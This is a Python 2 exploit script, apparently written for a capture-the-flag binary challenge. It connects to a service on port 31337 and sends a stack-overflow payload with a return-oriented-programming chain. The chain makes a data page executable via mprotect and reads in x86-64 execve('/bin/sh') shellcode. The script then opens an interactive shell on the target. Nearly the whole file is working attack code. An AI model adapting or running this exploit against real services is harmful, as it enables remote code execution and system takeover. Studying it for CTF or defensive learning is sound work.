#!/usr/bin/python
# -*- coding: utf-8 -*-
# snip from http://rintaro.hateblo.jp/entry/2016/05/24/002700
import sys, socket, struct, telnetlib, time

###################### func ######################
def sock(remoteip, remoteport):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((remoteip, remoteport))
	f = s.makefile("rw", bufsize=0)
	return s, f

def read_until(f, delim="\n"):
	data = ""
	while not data.endswith(delim):
		data += f.read(1)
	return data

def shell(s):
	t = telnetlib.Telnet()
	t.sock = s
        #s.send('id\n')
	t.interact()

def p32(a): 
    return struct.pack("<I", a)

def p64(a): 
    return struct.pack("<Q", a)

###################### main ######################

RHOST = 'remote.host.addr'
LHOST = 'localhost'
PORT  = 31337

def main(argv):
	if(len(argv) == 2 and argv[1] == "r"):
		print "[+] connect to remote."
		s, f = sock(RHOST, PORT)
	else:
		print "[+] connect to local."
		s, f = sock(LHOST, PORT)
                raw_input('>>> ready to attach debugger ...')


	# shellcraft amd64.linux.sh
	sc = "6a6848b82f62696e2f2f2f73504889e731f66a3b58990f05".decode('hex')

        data_addr          = 0x00000000006ca080
	sys_read           = 0
	sys_mprotect       = 10 + 1
        sys_dup2           = 33
        sys_execve         = 59
        mprotect_data_addr = data_addr & 0xFFFFFFFFFFFFF000
        pop_rax            = 0x00000000004786d6 #: pop rax ; pop rdx ; pop rbx ; ret
        pop_rdi            = 0x00000000004015a6
        pop_rsi            = 0x00000000004016c7
        pop_rdx            = 0x0000000000442a06
        syscall            = 0x000000000046ad25
        sub_rax            = 0x000000000043dc33 # sub rax, 1 ; ret
        xor_rax            = 0x00000000004260ef # xor rax, rax ; ret

	rop = ""
	# dup2(sock/fd, standard input/output/error)
        #for n in range(0, 3):
        #    rop += p64(pop_rdi)  # 
        #    rop += p64(4)        # sock/fd
        #    rop += p64(pop_rsi)
        #    rop += p64(n)        # std. input/output/error
        #    rop += p64(pop_rax)  # syscall number
        #    rop += p64(sys_dup2) # dup2
        #    rop += p64(0x4142434445464748) # dummy
        #    rop += p64(0x4142434445464748) # dummy
        #    rop += p64(syscall)  # system call

        # _mprotect(mprotect_data_addr, 0x1000, 7)
        rop += p64(pop_rax) 
        rop += p64(sys_mprotect) 
        rop += p64(0x4142434445464748) 
        rop += p64(0x4142434445464748) 
        rop += p64(sub_rax)            # avoid \r
        rop += p64(pop_rdi) 
        rop += p64(mprotect_data_addr) # data section
        rop += p64(pop_rsi) 
        rop += p64(0x1000)             # size
        rop += p64(pop_rdx) 
        rop += p64(7)                  # RWX for executing shellcode
        rop += p64(syscall) 

        # ___libc_read(STDIN, data_addr, len(sc))
        rop += p64(xor_rax)            # read syscall
        rop += p64(pop_rdi) 
        rop += p64(0)                  # sock/file
        rop += p64(pop_rsi) 
        rop += p64(data_addr)          # place for saving shellcode
        rop += p64(pop_rdx) 
        rop += p64(len(sc))            # sizoef(shellcode)
        rop += p64(syscall) 

        rop += p64(data_addr) 

	payload = 'A'*72 + rop + '\n'
	f.write( payload )

	time.sleep(0.3)
	f.write(sc)

	print "[+] interact mode:"
	shell(s)

if __name__ == "__main__":
    if len(sys.argv) == 1:
	main('l')
    else:
	main(sys.argv)
